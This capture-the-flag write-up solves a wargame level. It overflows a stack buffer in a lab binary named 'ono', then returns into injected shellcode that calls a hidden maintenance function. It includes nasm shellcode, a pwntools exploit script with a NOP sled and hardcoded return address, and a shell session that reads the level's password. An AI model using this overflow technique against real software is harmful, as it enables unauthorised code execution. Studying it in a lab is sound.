After analyzing the source code of the executable `ono`, the target attack vector is clear: we need to execute the function `maintenance_exec` with its first argument set to `0xdeadbeef`. We can perform a direct buffer overflow to overwrite the saved `RIP` register and jump to a small custom shellcode.

The shellcode sets up the argument and calls `maintenance_exec` at address `0x401276` (retrieved using GDB via `info functions`):

```nasm
section .text
global _start

_start:
    mov rdi, 0xdeadbeef
    mov rax, 0x401276
    call rax

```

The binary security protections are identical to `level00`:

```sh
level01@rainfall:~$ checksec ono
[*] '/home/level01/ono'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

Because ASLR and PIE are not active and the stack is executable, the addresses obtained in GDB remain reliable at runtime.

Using GDB, we find:

* **Buffer start address:** `0x7fffffffec70`
* **Offset to saved RIP:** 64 bytes (buffer) + 8 bytes (saved `RBP`) = 72 bytes.

**`exploit.py`:**

```python
import sys
from pwn import *

offset = 72
# Shellcode: mov rdi, 0xdeadbeef; mov rax, 0x401276; call rax
shellcode = b'\xbf\xef\xbe\xad\xde\xb8\x76\x12\x40\x00\xff\xd0'

# Prepend NOP sled to handle minor stack shifts
payload = b'\x90' * 16 + shellcode
payload += b'\x90' * (offset - len(payload))

buff_address = p64(0x7fffffffec70)
payload += buff_address

sys.stdout.buffer.write(payload)

```

**Execution & Flag Capture:**

```sh
level01@rainfall:~$ env -i bash -c "(cat in.bin; cat) | /home/level01/ono"
  [ONO-SENDAI VII] Cyberspace deck online.
  [ONO-SENDAI VII] Diagnostic subsystem v2.1.4
  [ONO-SENDAI VII] Waiting for operator ID: [ONO-SENDAI VII] Unknown operator. Logging attempt.
ls
README  exploit.py  in.bin  ono  ono.c
whoami
flag01
cat /home/flag01/.pass
3309s5bx9kagi0z0qt0erxvivievlh86

```